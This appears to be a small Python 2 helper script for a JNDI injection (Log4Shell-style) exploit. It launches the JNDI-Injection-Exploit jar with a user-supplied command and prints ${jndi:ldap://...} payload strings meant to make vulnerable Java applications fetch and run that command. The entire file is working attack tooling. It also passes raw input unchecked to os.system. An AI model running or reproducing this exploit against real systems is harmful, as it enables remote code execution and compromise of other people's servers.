import subprocess,os,sys,base64
Path="java"
Host = "127.0.0.1"

print("Generate:${jndi:ldap:://127.0.0.1/} ")
Command = raw_input("Input Command:")
command=[Path,"-jar","JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar","-A",Host,"-C","\""+ Command+"\""]
print("Test Payload:${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/%s}"%Command)
subp = os.system(" ".join(command))
